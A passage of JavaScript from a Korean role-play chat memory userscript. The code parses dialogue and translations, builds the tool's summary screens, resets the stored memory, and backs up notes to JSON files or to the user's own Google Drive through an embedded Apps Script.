      // 번역·장면 줄 (라벨이 조금씩 달라도)
      const lab = line0.match(/^[*_\s]*(번역|해석|장면|상황|배경)[*_\s]*[:：]\s*(.*)$/);
      if (lab && last) { last[/번역|해석/.test(lab[1]) ? 'tr' : 'ctx'] = unq(lab[2].trim()); continue; }
      if (/^🎬/.test(line0) && last) { last.ctx = line0.replace(/^🎬\s*/, '').trim(); continue; }
      // 같은 줄 끝에 *번역* 이 붙은 경우
      let line = line0, tr0 = '';
      const tm = line.match(/\s+\*([^*]+)\*\s*$/);
      if (tm) { tr0 = tm[1].trim(); line = line.slice(0, tm.index).trim(); }
      // 화자 → 상대: "대사"
      let m = line.match(/^(.+?)\s*(?:(?:→|->)\s*(.+?))?\s*[:：]\s*["“「『](.+?)["”」』]\s*(?:\((.*)\))?\s*$/);
      if (m) { qs.push(fixQuote({ who: canon(m[1]), to: canon(m[2] || ''), text: m[3], ctx: (m[4] || '').trim(), tr: tr0 })); continue; }
      // "대사" — 화자 → 상대
      m = line.match(/^["“「『](.+?)["”」』]\s*(?:[-—–~]+|[(（])\s*(.+?)[)）]?\s*$/);
      if (m) { const [w, t] = m[2].split(/\s*(?:→|->)\s*/); qs.push({ who: canon(w || ''), to: canon(t || ''), text: m[1], ctx: '', tr: tr0 }); continue; }
      // 따옴표 없이 따로 떨어진 줄 = 앞 대사의 번역(한글이면) 또는 장면
      if (last && !/["“”「」『』]/.test(line)) {
        const body = unq(line);
        if (!last.tr && /[가-힣]/.test(body) && !/\d{4}|[·]/.test(body)) last.tr = body; else if (!last.ctx) last.ctx = body;
        continue;
      }
      qs.push(fixQuote({ who: '', to: '', text: line, ctx: '', tr: tr0 }));
    }
    // 한국어 대사는 번역이 필요 없어요: 있어도 지웁니다
    for (const q of qs) if (/[가-힣]/.test(q.text) && !/[A-Za-z]{3,}/.test(q.text)) q.tr = '';
    return qs;
  }
  // 화자 칸이 비어 있거나 '?'인데 대사 안에 "화자 → 상대: \"대사\" *번역*"이 통째로 들어간 항목(이미 저장된 것 포함)을 풀어 줍니다
  function fixQuote(q) {
    if (q.who && q.who !== '?') return q;
    const m = String(q.text).match(/^\s*([^:：“"”「」『』\n]{1,30}?)\s*(?:(?:→|->)\s*([^:：“"”「」『』\n]{1,30}?))?\s*[:：]\s*["“「『](.+)["”」』]\s*(?:\*([^*]+)\*)?\s*$/);
    if (!m) return q.who === '?' ? { ...q, who: '' } : q;
    return { ...q, who: canon(m[1].trim()), to: canon((m[2] || q.to || '').trim()), text: m[3].trim(), tr: q.tr || (m[4] || '').trim() };
  }
  function threads() {
    const list = [];
    for (const l of itemsOf(bodyOf('서사 고리'))) {
      const q = l.match(/^근거\s*[:：]\s*(.*)$/);
      if (q) { if (list.length) list[list.length - 1].quote = q[1].replace(/^["“]|["”]$/g, ''); continue; }
      const t = l.match(/^번역\s*[:：]\s*(.*)$/);
      if (t) { if (list.length) list[list.length - 1].tr = t[1].replace(/^["“]|["”]$/g, ''); continue; }
      const m = l.match(/^\[(열림|닫힘)\]\s*(.*)$/);
      const closed = m ? m[1] === '닫힘' : false, rest = m ? m[2] : l;
      const i = rest.search(/[:：]/);
      list.push({ closed, title: i > 0 ? rest.slice(0, i).trim() : rest, text: i > 0 ? rest.slice(i + 1).trim() : '', quote: '' });
    }
    return list;
  }


  // "I'm not leaving you. (난 너 안 떠나.)" → ["I'm not leaving you.", "난 너 안 떠나."]
  //   "Hi" *안녕* · Hi _안녕_ 처럼 기울임으로 붙은 번역도 같이 나눕니다.
  function splitTr(text) {
    const m = String(text).match(/^(.*[A-Za-z].*?)\s*[(（]([^()（）]*[가-힣][^()（）]*)[)）]\s*$/)
      || String(text).match(/^(.*[A-Za-z].*?)["”]?\s*[*_]([^*_]*[가-힣][^*_]*)[*_]\s*$/);
    return m ? [m[1].trim().replace(/["”]$/, ''), m[2].trim()] : [String(text), ''];
  }
  function quoteHtml(q, tr = '') {
    if (!q) return '';
    // 근거: (12턴 · 2026.03.14) "원문" → 접힌 버튼엔 "근거 · 12턴", 펼치면 턴·날짜 한 줄 + 원문(대사·지문)
    const m = String(q).match(/^\s*[（(]([^)）]*턴[^)）]*)[)）]\s*(.*)$/), meta = m ? m[1].trim() : '';
    const unq = t => String(t || '').trim().replace(/^["“”]+|["“”]+$/g, '').trim();
    const body = unq(m ? m[2] : q);
    const turn = (meta.match(/\d+\s*턴/) || [''])[0];
    const wrap = inner => `<details class="evd"><summary>근거${turn ? ` · ${esc(turn)}` : ''}</summary><div class="quote">${meta ? `<small class="evm">${esc(meta)}</small>` : ''}${inner}</div></details>`;
    // 「지문」 "대사 (번역)" → 지문은 따옴표 없이 흐린 기울임, 대사는 "…" + 번역 줄.
    //   부르는 쪽에서 끝 따옴표를 떼고 넘겨도 되게, 닫는 따옴표가 없는 마지막 대사도 받습니다.
    const raw = String(m ? m[2] : q).trim();
    if (/「[^」]*」/.test(raw) && !tr) return wrap([...raw.matchAll(/「([^」]*)」|["“]([^"“”]*)["”]?/g)].filter(x => (x[1] ?? x[2]).trim()).map(x => {
      if (x[1] != null) return `<span class="nar">${esc(x[1].trim())}</span>`;
      const [o, t] = splitTr(x[2].trim()); return `<span>"${esc(o)}"</span>${t ? `<span class="tr">${esc(t)}</span>` : ''}`; }).join(''));
    // 번역은 "번역:" 이름표·따옴표 없이 원문 아래 흐린 줄로만(명대사와 같은 모양).
    const [orig, inl] = splitTr(body); tr = unq(String(tr || inl).replace(/^\s*-?\s*번역\s*[:：]\s*/, ''));
    return wrap(`<span>"${esc(orig)}"</span>${tr ? `<span class="tr">${esc(tr)}</span>` : ''}`);
  }


  // "이름: 내용" 처럼 앞에 이름표가 있는 줄인지 봅니다. 17:30 같은 시간은 제외.
  function labelCut(l) {
    const m = l.match(/^([^:：]{1,24}?)[:：](?!\d)/);
    return m && !/\d$/.test(m[1]) ? m[1].length : -1;
  }
  const emptyBox = text => `<div class="empty">${text}</div>`;
  const editBtn = key => `<button class="linkbtn" data-act="edit" data-arg="${esc(editKey(key))}">${icon('note', 'currentColor', 14)}고치기</button>`;

  // ── 확인(홈) ──
  // 기억의 실: 정리할 때마다 매듭 하나. 진한 실 = 노트에 들어간 턴, 점선 = 그 뒤로 쌓인 턴 (설정 › 정리 기록)
  function threadHtml() {
    const n = snapshot?.note; if (!n) return '';
    const turns = freshTurns(), covered = n.turns, now = covered + turns, span = Math.max(now, 1);
    const pct = t => (t / span * 100).toFixed(2);
    const knots = [...new Set(usage.map(r => r.to).filter(t => t > 0 && t <= covered).concat([covered]))].sort((a, b) => a - b);
    return `<div class="thread" role="img" aria-label="${covered}턴까지 정리됨, 그 뒤로 ${turns}턴 쌓임">
      <i class="th-done" style="width:${pct(covered)}%"></i>
      ${turns ? `<i class="th-wait" style="left:${pct(covered)}%;width:${(pct(now) - pct(covered)).toFixed(2)}%"></i>` : ''}
      ${knots.map((k, i) => `<b class="knot${i < knots.length - 1 ? ' small' : ''}" style="left:${pct(k)}%">${i === knots.length - 1 ? `<span>${k}턴</span>` : ''}</b>`).join('')}
      ${turns ? `<b class="knot now" style="left:${pct(now)}%"><span>지금 ${now}턴</span></b>` : ''}</div>`;
  }

  // 받침에 맞는 조사: josa('유진', '이', '가') → '유진이'
  const josa = (w, a, b) => { const c = String(w).trim().slice(-1).charCodeAt(0) - 0xAC00; return w + (c >= 0 && c <= 11171 ? (c % 28 ? a : b) : b); };

  function homeHtml() {
    if (!snapshot) return emptyBox(loading ? '대화를 읽는 중이에요…' : '불러오는 중…');
    const n = snapshot.note, turns = freshTurns(), left = Math.max(0, cycle - turns), due = turns >= cycle;
    // 큰 진행 링: 다음 정리까지
    const R = 64, C = 2 * Math.PI * R, done = Math.min(turns, cycle) / cycle, over = Math.max(0, turns - cycle), overP = Math.min(1, over / cycle);
    const ring = `<div class="bigring${due ? ' due' : ''}">
      <svg viewBox="0 0 160 160" aria-hidden="true"><circle cx="80" cy="80" r="${R}" class="track"/>
        <circle cx="80" cy="80" r="${R}" class="fill" stroke-dasharray="${(C * done).toFixed(1)} ${C.toFixed(1)}" transform="rotate(-90 80 80)"/>
        ${over ? `<circle cx="80" cy="80" r="${R}" class="over" stroke-dasharray="${(C * overP).toFixed(1)} ${C.toFixed(1)}" transform="rotate(-90 80 80)"/>` : ''}</svg>
      <div class="ringtext">${over ? `<b>+${over}</b><span>턴 넘었어요</span>` : due ? '<b>정리할<br>때예요</b>' : `<b>${left}</b><span>턴 남았어요</span>`}<small>${turns} / ${cycle}</small></div></div>`;
    const hero = `<section class="hero2">${ring}
      <p class="hero-sub">${n ? `1~${n.turns}턴을 기억하고 있어요` : '아직 정리한 기억이 없어요'}</p>
      ${n?.at ? `<p class="hero-meta">마지막 정리 · ${esc(new Date(n.at).toLocaleString('ko-KR', { month: 'long', day: 'numeric', hour: 'numeric', minute: '2-digit' }))}${n.by ? ` · ${esc(n.by)}${n.by === DEVICE ? ' (이 기기)' : ''}` : ''}</p>` : ''}
      <div class="hero-btns"><button class="btn${!n ? ' pri' : ''}${due ? ' due' : ''} hero-run" data-act="runsheet"${busyNow ? ' disabled' : ''}>${busyNow ? '정리하는 중…' : '정리하기'}</button></div>
      <div class="hero-foot"><label class="inj-sw"><input type="checkbox" data-act="inject"${injectOn ? ' checked' : ''}${busyNow ? ' disabled' : ''}><i></i>채팅에 넣기${injectOn ? '' : ' <small>꺼짐</small>'}</label>
        ${n ? `<span class="hero-dot">·</span><button class="hero-reset" data-act="reset"${busyNow ? ' disabled' : ''}>기억 초기화</button>` : ''}</div>
      ${n ? '' : '<p class="muted" style="text-align:center;margin:10px 0 0">정리하면 지금까지의 이야기를 노트로 만들어 채팅 안에 보이지 않게 넣어 둬요.</p>'}</section>`;
    if (!n) return hero;

    // 노트 구성: AI가 실제로 읽는 노트 기준. 한 줄 색 막대 + 크기순 칩(누르면 그 칸으로)
    const injectedText = stripProof(noteMemory()), injected = injectedText.length;
    const parts = splitSections(injectedText).map(x => ({ key: x.key, len: x.body.length })).filter(x => x.len).sort((a, b) => b.len - a.len);
    const total = parts.reduce((a, x) => a + x.len, 0) || 1;
    const donut = `<div class="h3 comp-h"><span>노트 구성</span><span class="comp-n"><b>${fmt(injected)}</b> / ${fmt(NOTE_LIMIT)}자</span></div>
      <div class="stack" role="img" aria-label="노트 ${fmt(injected)}자">${parts.map(x => `<i style="width:${(x.len / total * 100).toFixed(2)}%;background:${secInfo(x.key).color}"></i>`).join('')}</div>
      <div class="stack-cap" style="width:${Math.min(100, injected / NOTE_LIMIT * 100).toFixed(1)}%"></div>
      <div class="chips2">${parts.map(x => `<button data-act="jump" data-arg="${tabFor(x.key)}|${esc(x.key)}"><i style="background:${secInfo(x.key).color}"></i>${esc(x.key)}<span>${Math.round(x.len / total * 100)}%</span></button>`).join('')}</div>`;

    const cast = [...people().keys()];
    const castHtml = cast.length ? `<div class="h3">등장인물</div><div class="cast-row">${cast.map(nm =>
      `<button data-act="castpick" data-arg="${esc(nm)}">${avatar(nm)}<span>${esc(nm)}</span></button>`).join('')}</div>
` : '';
    const old = /^##\s/m.test(n.memory) ? '<div class="notice">예전 형식 노트예요. 다음 정리 때 새 형식으로 바뀌어요.</div>' : '';
    // 마지막 정리에서 바뀐 것 한 줄 요약(누르면 회차별 바뀐 것). 나머지 도구는 설정 › 도구에.
    const h = histList[histList.length - 1];
    const recent = h ? (() => {
      // 칩 + 한 줄로 짧게(약속·습관 칸과 같은 모양). 최대 6줄, 더 보려면 아래 링크
      const c = changesOf(h.before, h.after), rows = [], cut = t => { t = String(t); return t.length > 48 ? t.slice(0, 47) + '…' : t; };
      const dirHtml = d => { const [x, y] = d.split(/\s*→\s*/); return y ? nameChip(x) + '<i class="nar">→</i>' + nameChip(y) + ' ' : esc(d) + ' '; };
      if (c.people.length) rows.push('<li><em class="rk">새 인물</em>' + c.people.map(esc).join(', ') + '</li>');
      for (const r of c.rels) rows.push('<li><em class="rk">관계</em>' + dirHtml(r.dir) + esc(cut(relPart(r.after))) + '</li>');
      for (const x of c.feels) { const t = x.added[x.added.length - 1].text; rows.push('<li><em class="rk">마음</em>' + dirHtml(x.dir) + '<span class="hl">' + esc(cut((t.split('|')[1] || t).trim())) + '</span></li>'); } // 형광펜은 감정 낱말에만
      for (const sec of c.sections) {
        if (sec.key === '날짜로그') { for (const l of sec.added) { const m = l.match(/^[▸#\s]*\[?([^\]\-]+?)\s*-\s*(.+?)\]?$/); if (/^(▸|###)/.test(l) && m) rows.push('<li><em class="rk">사건</em>' + esc(cut(m[2])) + ' <small class="pdim">' + esc(m[1]) + '</small></li>'); } continue; }
        if (sec.added.length) rows.push('<li><em class="rk">' + esc(secInfo(sec.key).short) + '</em>' + esc(cut(sec.added[0].replace(/^[▸#\s]+/, ''))) + (sec.added.length > 1 ? ' <small class="pdim">외 ' + (sec.added.length - 1) + '줄</small>' : '') + '</li>');
      }
      return '<div class="h3">최근 정리에서 바뀐 것 <small class="muted">' + (h.from + 1) + '~' + h.to + '턴</small></div>'
        + (rows.length ? '<ul class="nrules">' + rows.slice(0, 6).join('') + '</ul>' : '<p class="muted">큰 변화 없음</p>')
        + '<button class="linkbtn" data-act="changes" style="margin:8px 0 4px">' + (rows.length > 6 ? '나머지 ' + (rows.length - 6) + '개 · ' : '') + '자세히 · 지난 회차</button>';
    })() : '';
    return old + hero + castHtml + recent + donut;
  }

  // ── 정리하기: 무엇을(이어서·노트만·처음부터) × 누가(설정한 AI·다른 AI 파일) 한 화면
  function runHtml() {
    const n = snapshot?.note, turns = freshTurns();
    const opt = (group, val, title, sub, on = true) => `<button class="opt${nav[group] === val ? ' on' : ''}" data-act="${group}" data-arg="${val}"${on ? '' : ' disabled'}>
      <i></i><span><b>${title}</b><small>${sub}</small></span></button>`;
    const contMode = n && !turns ? 'tidy' : 'new';
    if (nav.runMode !== 'rebuild') nav.runMode = contMode;
    return `<h4 class="sg">무엇을</h4><div class="opts">
        ${opt('runMode', contMode, '이어서 정리', contMode === 'tidy' ? '새 대화가 없어서 지금 노트를 새 형식으로 다듬어요' : n ? `지난 정리 뒤 새 대화 ${turns}턴` : `지금까지 ${turns}턴을 처음 정리`)}
        ${opt('runMode', 'rebuild', '처음부터 정리', '채팅 전체를 다시 읽어 싹 새로 만들어요 · 길면 다른 AI로 하는 게 싸요')}
      </div>
      <h4 class="sg">누가</h4><div class="opts">
        ${opt('runBy', 'api', '설정한 AI', `${esc(nav.modelLabel || '설정의 모델')}${nav.hasKey ? '' : ' · 키가 없어요 (설정에서 넣기)'}`, nav.hasKey)}
        ${opt('runBy', 'file', '다른 AI · 키 없이', 'ChatGPT·Gemini·Claude 채팅에 파일로 맡겨요 · 싸게')}
      </div>
      ${nav.runBy === 'file' ? `<ol class="steps">
        <li><b>① 요청 파일 받기</b>로 .txt를 받아 AI 채팅에 올리고 보내요. 끊기면 "계속".</li>
        <li>AI가 준 결과를 .txt로 저장해요. (파일로 못 주면 메모장에 붙여 저장)</li>
        <li><b>② 결과 파일 불러오기</b>로 열면 바로 채팅에 들어가요.</li></ol>` : ''}
`;
  }

  // 기억 초기화: 채팅 속 노트(리롤로 밀려난 답에 남은 것까지)와 이 기기의 정리 기록을 지워, 처음 정리하는 방처럼 만듭니다.
  //   명대사·ETC(폰·게시판 등)·AI 사용 기록은 그대로 둡니다. 백업은 자동으로 받지 않아요(아이폰 등에서 저장 창이 끼어들지 않게). 필요하면 "노트 내보내기"를 먼저.
  // 기억 초기화 = 이 방을 완전히 처음 상태로: 채팅 속 노트 전부 · 이 기기의 정리본·사본·기록 · 명대사 · ETC 전부 · 쓴 돈 기록 · 구글 백업까지.
  //   리롤로 밀려난 답에 남은 노트도 지워요. 되돌릴 수 없어서 한 번 확인해요(직접 누른 버튼이라 사파리에서도 창이 떠요).
  async function resetMemory() {
    const chatId = chatIdFromPath(); if (!chatId || busyNow) return;
    if (!confirm('이 방을 완전히 처음 상태로 지워요. 되돌릴 수 없어요.\n\n· 채팅에 넣은 기억 노트\n· 정리 기록 · 이 기기 사본\n· 명대사 · ETC 전부(커뮤·폰·컴퓨터·뉴스·위키·실시간톡·찾은 인물)\n· 쓴 돈 기록' + (nav.gsOn ? '\n· 구글 드라이브 백업' : '') + '\n\n대화 내용(RP)은 그대로예요. 지울까요?')) return;
    busyNow = true; render(); toast('이 방을 처음 상태로 지우는 중…');
    try {
      let cursor = '', fixed = 0;
      for (let page = 0; page < 40; page++) {
        const { list, next } = await listPage(chatId, cursor);
        for (const m of list) { const t = msgText(m); if (/MEMO_NOTE/.test(t)) { const cleaned = stripBlocks(t).trimEnd(); if (cleaned !== t) { await writeMessage(chatId, msgId(m), cleaned); fixed++; } } }
        if (!(cursor = next)) break;
      }
      etcQuiet = true;
      try { for (const k of [...BACKUP_KEYS, 'parked', 'ext', 'full', 'moved', 'seen', 'lostSkip', 'fullSkip', 'etcSkip', 'gsAsked']) await setValue(k + ':' + chatId, ''); }
      finally { etcQuiet = false; }
      const now = new Date().toISOString();
      await setValue('resetAt:' + chatId, now); await setValue('etcAt:' + chatId, now);
      if (nav.gsOn) try { await gsCall({ action: 'wipe', chat: chatId }); }
        catch (e) { try { await gsCall({ action: 'save', chat: chatId, title: roomTitle(), data: JSON.stringify({ app: 'memo-note', v: 3, at: now, by: DEVICE, chat: chatId, upto: '', turns: 0, noteAt: '', memory: '', store: {}, reset: true }) }); toast('구글 스크립트가 예전 버전이라 이전 백업은 남아 있어요. 설정 › 백업에서 스크립트를 새로 붙여 넣어 주세요.', 'info', 6000); } catch (e2) { toast('구글 백업 지우기 실패 · ' + e2.message, 'err', 5000); } }
      draft = null; nav = fresh(); fullNote = null;
      toast(`이 방을 처음 상태로 지웠어요${fixed ? `(노트 ${fixed}곳 지움)` : ''}. "정리하기"를 누르면 처음부터 새로 만들어요.`, 'ok', 4500);
      await refresh();
    } catch (e) { toast('초기화 실패 · ' + e.message, 'err'); }
    finally { busyNow = false; render(); }
  }



  // 백업: 근거·감정선·명대사까지 든 전체 노트 + 정리 기록을 파일 하나로
  function downloadText(name, text, type = 'text/plain') {
    const a = document.createElement('a');
    a.href = URL.createObjectURL(new Blob([text], { type: type + ';charset=utf-8' }));
    a.download = name; document.body.appendChild(a); a.click(); a.remove();
  }
  // 백업에 담는 이 방의 기기 저장값. 노트 자리(full·parked·moved)는 불러올 때 확인 화면 → 넣기로 다시 만들어져서 되살리지 않아요.
  const BACKUP_KEYS = ['hist', 'edited', 'quotes', 'etcnames', 'phone', 'pc', 'board', 'news', 'wiki', 'live', 'usage'];
  async function backupData() {
    const chatId = chatIdFromPath(), n = snapshot?.note; if (!chatId) return null;
    const store = {};
    for (const k of BACKUP_KEYS) { const v = await getValue(k + ':' + chatId, ''); if (v) store[k] = v; }
    if (!n && !Object.keys(store).length) return null;
    return { app: 'memo-note', v: 3, at: new Date().toISOString(), by: DEVICE, chat: chatId, upto: n?.upto || '', turns: n?.turns || 0, noteAt: n?.at || '', memory: n ? noteMemory() : '', store };
  }
  async function exportBackup() {
    const data = await backupData(), n = snapshot?.note; if (!data) return toast('내보낼 게 없어요.', 'info', 2500);
    const day = new Date().toLocaleDateString('ko-KR', { month: '2-digit', day: '2-digit' }).replace(/\D+/g, '');
    downloadText(`조아메모리-백업-${day}-${n?.turns || 0}턴.json`, JSON.stringify(data, null, 2), 'application/json');
    toast('이 방 전체를 파일로 내보냈어요. 아이클라우드·구글 드라이브에 저장해 두세요.', 'ok', 4500);
  }
  // 백업 파일(.json)이나 노트만 적힌 .txt → ETC·기록은 이 기기에 바로, 노트는 미리보기. 확인 후 '채팅에 넣기'로 들어갑니다.
  const importBackup = async file => importBackupText(await file.text());
  async function importBackupText(raw, checked = false) {
    const chatId = chatIdFromPath();
    let memory = '', turns = 0, upto = '', d = null;
    try { d = JSON.parse(raw); if (d && d.app === 'memo-note' && d.memory) { memory = d.memory; turns = Number(d.turns) || 0; upto = d.upto || ''; } } catch (_) {}
    if (d?.app === 'memo-note' && d.store && Object.keys(d.store).length && chatId) {
      const other = d.chat && d.chat !== chatId;
      const when = d.at ? new Date(d.at).toLocaleString('ko-KR', { month: 'numeric', day: 'numeric', hour: 'numeric', minute: '2-digit' }) : '';
      if (checked || confirm(`${when ? when + '에 만든 ' : ''}백업이에요${other ? '\n⚠ 다른 대화방에서 만든 백업이에요' : ''}.\n\n명대사 · ETC(폰·커뮤니티 등) · 정리 기록을 이 기기에 불러올까요?\n(이 방에 지금 있는 ETC·기록은 백업 내용으로 바뀌어요)\n\n[확인] 불러오기  [취소] 노트만 보기`)) {
        etcQuiet = true; try { for (const [k, v] of Object.entries(d.store)) if (BACKUP_KEYS.includes(k)) await setValue(k + ':' + chatId, String(v)); } finally { etcQuiet = false; }
        await refresh(); toast('명대사 · ETC · 기록을 불러왔어요.', 'ok', 3000);
      }
    }
    if (d?.app === 'memo-note' && !memory) return;
    if (!memory) { memory = normalizeImported(raw); const problem = checkImported(memory); if (problem) return toast(problem, 'err', 5000); }
    const chat = (snapshot?.all || []).filter(isChat);
    const here = upto && chat.some(m => msgId(m) === upto);
    if (!here) { upto = chat.length ? msgId(chat[chat.length - 1]) : ''; if (!turns) turns = (snapshot?.note?.turns || 0) + freshTurns(); }
    if (!upto) return toast('노트를 붙일 대화가 없어요.', 'err', 3000);
    draft = { sections: splitSections(memory), uptoId: upto, turns: turns || 1, evidence: { ok: 0, bad: 0 }, kept: [], lost: [],
      sub: `파일에서 불러온 노트예요${here ? '' : ' (다른 기기·방의 노트라 지금 대화 끝에 붙여요)'}. 확인하고 채팅에 넣어 주세요.` };
    nav.view = 'preview'; render();
  }

  // ── 구글 드라이브 백업 (Apps Script 웹 앱) ──
  //   사용자가 자기 구글 계정에 아래 스크립트를 한 번 배포하고, 그 주소와 비밀번호를 설정에 넣어요.
  //   백업은 그 사람 드라이브 "조아메모리 백업" 폴더에 방마다 파일 하나(방 ID.json). 로그인 만료가 없어 아이폰에서도 됩니다.
  const GS_CODE = "// 조아메모리 구글 드라이브 백업 v2 — script.google.com 에서 [새 프로젝트]를 만들고 원래 있던 글을 지운 뒤 이 글을 통째로 붙여 넣으세요.\n// (이미 v1을 쓰고 있었다면: 같은 프로젝트에 이 글로 바꿔 붙여 넣고 저장 → [배포] → [배포 관리] → 연필 → 버전: 새 버전 → [배포]. 주소는 그대로예요)\n// 1) 아래 SECRET 을 나만 아는 비밀번호로 바꾸기\n// 2) 오른쪽 위 [배포] → [새 배포] → 톱니바퀴에서 유형: 웹 앱 → 다음 사용자로 실행: 나 → 액세스 권한: 모든 사용자 → [배포]\n//    (처음엔 구글이 권한을 물어요: 계정 선택 → 고급 → 이동 → 허용. 내 드라이브에 백업 폴더를 만들려는 거예요)\n// 3) 나온 웹 앱 URL(…/exec)과 SECRET 을 조아메모리 설정 › 백업 › 구글 드라이브 백업 창에 넣고 [연결 저장]\n// 방마다 파일 두 개: '제목 (방ID).json' = 최신, '제목 (방ID) 이전.json' = 바로 전 백업\nconst SECRET = '여기를-비밀번호로-바꾸세요';\nconst FOLDER = '조아메모리 백업';\nfunction folder_() { const it = DriveApp.getFoldersByName(FOLDER); return it.hasNext() ? it.next() : DriveApp.createFolder(FOLDER); }\nfunction out_(o) { return ContentService.createTextOutput(JSON.stringify(o)).setMimeType(ContentService.MimeType.JSON); }\nfunction find_(f, id, prev) { const all = f.getFiles(); while (all.hasNext()) { const x = all.next(), n = x.getName(); if (n.indexOf('(' + id + ')') >= 0 && (n.indexOf(' 이전.json') >= 0) === !!prev) return x; } return null; }\nfunction doGet() { return out_({ ok: true, app: 'joamemory-backup', v: 2 }); }\nfunction doPost(e) {\n  const b = JSON.parse(e.postData.contents || '{}');\n  if (b.key !== SECRET) return out_({ ok: false, error: '비밀번호가 달라요' });\n  if (b.action === 'ping') return out_({ ok: true, v: 2 });\n  const id = String(b.chat || '').replace(/[^A-Za-z0-9_-]/g, ''), f = folder_(), x = find_(f, id, false), p = find_(f, id, true);\n  const base = (String(b.title || '').trim() || '조아메모리') + ' (' + id + ')';\n  if (b.action === 'save') {\n    if (x) { const old = x.getBlob().getDataAsString(); if (p) { p.setContent(old); p.setName(base + ' 이전.json'); } else f.createFile(base + ' 이전.json', old, MimeType.PLAIN_TEXT); x.setContent(b.data); x.setName(base + '.json'); }\n    else f.createFile(base + '.json', b.data, MimeType.PLAIN_TEXT);\n    return out_({ ok: true });\n  }\n  if (b.action === 'load') { if (!x) return out_({ ok: false, error: '이 방 백업이 아직 없어요' }); return out_({ ok: true, data: x.getBlob().getDataAsString(), at: x.getLastUpdated(), prev: p ? p.getBlob().getDataAsString() : '' }); }\n  if (b.action === 'wipe') { if (x) x.setTrashed(true); if (p) p.setTrashed(true); return out_({ ok: true }); }\n  return out_({ ok: false, error: '알 수 없는 요청' });\n}";
  // 드라이브에서 알아보기 쉽게 파일 이름에 방(캐릭터) 제목을 붙여요. 찾을 때는 방 ID로 찾아서 제목이 바뀌어도 같은 파일.
  const roomTitle = () => String(document.title || '').replace(/\s*[|·–—-]\s*(크랙|뤼튼|wrtn|crack).*$/i, '').replace(/[\\/:*?"<>|]/g, '').trim().slice(0, 40);
  async function gsCall(body) {
    const url = String(await getValue('gsUrl', '')).trim(), key = String(await getValue('gsKey', '')).trim();
    if (!/^https:\/\/script\.google\.com\/.+\/exec$/.test(url) || !key) throw new Error('설정 › 백업에 구글 백업 주소(…/exec)와 비밀번호를 먼저 넣고 저장해 주세요.');
    const text = await requestRaw('POST', url, { body: { ...body, key }, timeout: 60000 });
    let r; try { r = JSON.parse(text); } catch (_) { throw new Error('구글 응답을 읽지 못했어요. 배포할 때 액세스 권한을 "모든 사용자"로 했는지 확인해 주세요.'); }
    if (!r.ok) throw new Error(r.error || '구글 백업 실패');
    return r;
  }
  // ② 사라짐 복구용: 구글 백업에 이 방 노트가 있으면 정보만 가져와요(넣는 건 카드에서 고를 때).
  async function gsFetch(chatId) { try { const r = await gsCall({ action: 'load', chat: chatId }), d = JSON.parse(r.data); return d?.app === 'memo-note' && d.chat === chatId ? d : null; } catch (_) { return null; } }
  async function gsPeek(chatId, resetAt = 0) {
    try {
      const d = await gsFetch(chatId); if (!d) return null;
      if (d?.app !== 'memo-note' || d.chat !== chatId || !d.memory) return null;
      const at = d.noteAt || d.at; if ((Date.parse(at) || 0) <= resetAt) return null;
      return { src: 'g', memory: d.memory, upto: d.upto, turns: d.turns, at, by: d.by || '', savedAt: d.at, savedBy: d.by || '' };
    } catch (_) { return null; }
  }
  async function gsSave(quiet = false) {
    try {
      const data = await backupData(); if (!data) { if (!quiet) toast('올릴 게 없어요.', 'info', 2500); return; }
      if (!quiet) toast('구글 드라이브에 올리는 중…');
      await gsCall({ action: 'save', chat: data.chat, title: roomTitle(), data: JSON.stringify(data) });
      if (!quiet) toast('구글 드라이브에 백업했어요.', 'ok', 3000);
    } catch (e) { toast('구글 백업 실패 · ' + e.message, 'err', 5000); }
  }
  // auto: 새 기기에서 방을 처음 열 때(이 기기에 이 방 기록이 하나도 없을 때) 한 번만. 백업이 없으면 조용히 넘어가요.
  async function gsLoad(auto = false) {
    if (!chatIdFromPath()) return;
    try {
      if (!auto) toast('구글 드라이브에서 이 방 백업을 찾는 중…');
      const chatId = chatIdFromPath(), r = await gsCall({ action: 'load', chat: chatId });
      let d = null; try { d = JSON.parse(r.data); } catch (_) {}
      // 이전 백업(바로 전에 덮어쓴 것)이 있으면 최신·이전 중 고르기. 최신이 비었으면(초기화) 이전만 물어요.
      let pv = null; try { pv = r.prev ? JSON.parse(r.prev) : null; } catch (_) {}
      const sum = x => x ? `1~${x.turns || 0}턴 · ${x.at ? new Date(x.at).toLocaleString('ko-KR', { month: 'long', day: 'numeric', hour: 'numeric', minute: '2-digit' }) : '시각 모름'}${x.by ? ' · ' + x.by : ''}${x.reset ? ' (초기화)' : ''}` : '';
      const usable = x => x && x.app === 'memo-note' && x.chat === chatId && !x.reset && (x.memory || Object.keys(x.store || {}).some(k => x.store[k]));
      if (usable(pv) && (!usable(d) || !confirm(`구글 드라이브에 이 방 백업이 두 개 있어요.\n\n· 최신: ${sum(d)}\n· 이전: ${sum(pv)}\n\n[확인] 최신으로 진행\n[취소] 이전 백업 보기`))) {
        if (!confirm(`이전 백업을 불러올까요?\n\n· ${sum(pv)}\n\n노트는 확인 화면을 거친 뒤에 채팅에 들어가요.`)) return;
        return importBackupText(r.prev, false); // 이전 백업은 ETC를 바꾸기 전에 한 번 더 물어요(잘못 눌렀을 때 바로 덮어쓰지 않게)
      }
      if (!d || d.app !== 'memo-note') throw new Error('조아메모리 백업 파일이 아니에요.');
      if (d.chat !== chatId) throw new Error('다른 대화방의 백업이라 불러오지 않았어요.');
      if (d.reset || (!d.memory && !Object.keys(d.store || {}).some(k => d.store[k]))) { if (!auto) toast('구글 백업이 비어 있어요(초기화된 방이에요).', 'info', 3000); return; }
      const when = d.at ? new Date(d.at).toLocaleString('ko-KR', { month: 'long', day: 'numeric', hour: 'numeric', minute: '2-digit' }) : '시각 모름';
      const now = snapshot?.note;
      if (!confirm(`구글 드라이브에서 이 방 백업을 찾았어요.\n\n· 방: ${roomTitle() || '이 방'} (방 ID 일치)\n· 백업한 때: ${when}${d.by ? ' · ' + d.by : ''}\n· 기억: 1~${d.turns || 0}턴${now ? `  (지금 이 방: 1~${now.turns}턴)` : ''}\n\n불러올까요? 노트는 확인 화면을 거친 뒤에 채팅에 들어가요.`)) return;
      await importBackupText(r.data, true);
    }
    catch (e) { if (!auto) toast('구글에서 불러오기 실패 · ' + e.message, 'err', 5000); }
  }
  // 구글 백업 창: 주소·비밀번호 · 처음 설정(스크립트 복사) · 지금 저장 · 불러오기
  function gsSheetHtml() {
    return `<div class="rsheet" data-act="gsclose"><div class="rbox gsbox" data-act="noop">
